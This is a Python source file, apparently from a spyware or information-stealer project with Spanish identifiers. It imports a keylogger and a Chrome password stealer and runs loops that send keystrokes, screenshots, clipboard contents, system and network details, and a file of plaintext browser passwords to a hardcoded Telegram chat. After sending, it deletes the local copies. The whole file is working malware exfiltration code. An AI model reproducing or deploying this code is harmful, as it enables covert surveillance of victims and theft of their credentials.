import asyncio
from keylogger import llista_teclas
import os
from funciones import registro_errores, capture_screenshot, get_clipboard_content, obtener_informacion_red, obtener_especificaciones_sistema
from password_stealer import get_chrome_passwords

async def capturar_teclas(bot):
    global llista_teclas
    while True:
        await asyncio.sleep(5)
        if llista_teclas:
            try:
                await bot.send_message(chat_id="817416698", text="\n".join(llista_teclas))
                llista_teclas.clear()
            except Exception as e:
                registro_errores(f"Error sending key presses: {e}")
                
async def capture_screenshots(bot):
    while True:
        await asyncio.sleep(15)
        try:
            screenshot_path = capture_screenshot()
            await bot.send_photo(chat_id="817416698", photo=open(screenshot_path, 'rb'))
            os.remove(screenshot_path)
        except Exception as e:
            registro_errores(f"Error capturing and sending the screen: {e}")

async def log_clipboard(bot):
    previous_content = ""
    while True:
        await asyncio.sleep(5)  
        current_content = get_clipboard_content()
        if current_content != previous_content:
            previous_content = current_content
            await bot.send_message(chat_id="817416698", text=f"Clipboard content: {current_content}") 

async def especificaciones_sistema(bot):
    await asyncio.sleep(0.001)
    especificaciones = obtener_especificaciones_sistema()
    await bot.send_message(chat_id="817416698", text=f"{especificaciones}") 

async def informacion_red(bot):
    await asyncio.sleep(0.001)
    informacion_red = obtener_informacion_red()
    await bot.send_message(chat_id="817416698", text=f"{informacion_red}")
        
async def passwords(bot):
    await asyncio.sleep(0.003)
    #Ejecuta la funcion de get_chrome_passwords() para obtener el path de las passwords en texto plano
    password_path = get_chrome_passwords()
    #Envia el archivo cookies.json al chat
    try:
        await bot.send_document(chat_id="817416698", document=open(password_path, "rb"))
        await asyncio.sleep(1)
        os.remove(password_path)
    except Exception as e:
        registro_errores(f"Error al enviar las passwords: {e}")
